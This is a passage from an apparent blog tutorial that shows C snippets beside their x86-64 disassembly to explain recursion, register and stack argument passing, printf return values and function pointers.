<p>With all that out of the way, let us take a brief look at how function calling works at the low level.</p>
<h2 id="functions">Functions</h2>
<p>I always wished to demonstrate people an infinite loop with recursion. So here you have it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">main</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">main</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>Each time the <code>call main</code> instruction is encountered, the <code>main()</code> function is called, and a new function frame is created. Due to the lack of an exit condition, the processor will never be able to read anything beyond the <code>call main</code> instruction, and thus the function will never return. Hence, the infinite loop.</p>
<p>Now take a look at how things change when we add arguments to a function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">main</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="mi">10</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="mi">9</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="mi">8</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="mi">7</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">r9d</span><span class="p">,</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">r8d</span><span class="p">,</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">ecx</span><span class="p">,</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edx</span><span class="p">,</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">main</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add</span>     <span class="no">rsp</span><span class="p">,</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">leave</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>If you examine the pattern, you will notice that the arguments are loaded in a particular sequence - from right to left. The first six arguments remain in the registers <code>edi</code>, <code>esi</code>, <code>edx</code>, <code>ecx</code>, <code>r8d</code> &amp; <code>r9d</code> (from left to right). The rest of the arguments are stored on the stack.</p>
<p>This pattern is followed by any function that you wish to invoke from your code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edx</span><span class="p">,</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>This is obviously not the correct method to invoke a <code>printf</code> function. <code>Printf</code>&rsquo;s first argument should be a string (possibly a format string).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.LC0:</span>
</span></span><span class="line"><span class="cl">        <span class="na">.string</span> <span class="s">&#34;Hello&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>The <code>Hello</code> string is kept at <code>LC0</code> offset here. So we load the offset&rsquo;s pointer to value and put it in <code>edi</code>. Then execute the <code>printf()</code> function, which will take as its first argument the value stored in the <code>edi</code> register.</p>
<p>If you are wondering what&rsquo;s the point of <code>mov     eax, 0</code> just before <code>printf</code> call&hellip; <a href="https://stackoverflow.com/questions/6212665/why-is-eax-zeroed-before-a-call-to-printf">read this StackOverflow thread</a> <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup></p>
<p>If we add 1 more argument to <code>printf</code> call, that should be stored in <code>esi</code> register. And the right-most argument will be processed first.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.LC0:</span>
</span></span><span class="line"><span class="cl">        <span class="na">.string</span> <span class="s">&#34;%d&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p><code>Printf</code>, like all other C functions, has a return value that is an <code>int</code> type. <code>Printf</code> gives the number of characters in the format string that the function has processed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.LC0:</span>
</span></span><span class="line"><span class="cl">        <span class="na">.string</span> <span class="s">&#34;%d&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; Prologue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; Getting memory block for variables
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">sub</span>     <span class="no">rsp</span><span class="p">,</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; first printf
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; Storing return value (eax) of printf in the local variable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; second printf
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; epologue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">leave</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>Remember how we talked about that the return values from functions are stored in <code>eax</code> register. Here also, the return value from <code>printf</code> is stored in <code>eax</code> which is then stored in some other local variable.</p>
<p>Since both of my strings for <code>printf</code> were exactly same, the compiler reused it to call <code>printf</code> second time, instead of creating 2 strings with same content.</p>
<h3 id="function-pointers">Function pointers</h3>
<p>Let us spice things up a little more now&hellip; and look at function pointers.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">main</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">main</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">main</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Output of this program is not what you might expect if you are not a seasoned C programmer or have never worked with function pointers before.</p>
<p>Output:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">0x55770bbfa139
</span></span><span class="line"><span class="cl">0x55770bbfa139
</span></span><span class="line"><span class="cl">0x55770bbfa139
</span></span></code></pre></div><p>Each of them gave the same output. This is not the case when working with integer pointers. Let&rsquo;s see how this looks at lower level</p>
<p>Disassembly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.LC0:</span>
</span></span><span class="line"><span class="cl">        <span class="na">.string</span> <span class="s">&#34;%p\n&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; printf(&#34;%p\n&#34;, main);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">main</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; printf(&#34;%p\n&#34;, *main);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">main</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; printf(&#34;%p\n&#34;, &amp;main);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">main</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>They are all precisely the same!! The assembly code for all three lines remains unchanged.</p>
<p>To test whether it behaves the same way with other functions as well, let&rsquo;s add another function to the code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">func</span><span class="p">()</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">func</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">func</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">func</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">func:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span><span class="line"><span class="cl"><span class="nl">.LC0:</span>
</span></span><span class="line"><span class="cl">        <span class="na">.string</span> <span class="s">&#34;%p\n&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; printf(&#34;%p\n&#34;, func);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">func</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; printf(&#34;%p\n&#34;, *func);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">func</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">;printf(&#34;%p\n&#34;, &amp;func);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">func</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>Still the same!!</p>
<p>If you have never worked with function pointers before, this is just the beginning of things, we can even call the function <code>func</code> using above pointer notations.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">func</span><span class="p">()</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">func</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">&amp;</span><span class="n">func</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">func:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; func();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">func</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; (*func)();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">func</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; (&amp;func)();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">func</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>We can even add arguments to our <code>func</code> function call, just like we do with a normal function&hellip; and the first argument will be stored in <code>edi</code> the second on in <code>esi</code> and so on.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">func</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">func</span><span class="p">)(</span><span class="mi">6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="mi">7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">&amp;</span><span class="n">func</span><span class="p">)(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.LC0:</span>
</span></span><span class="line"><span class="cl">        <span class="na">.string</span> <span class="s">&#34;%d\n&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">func:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
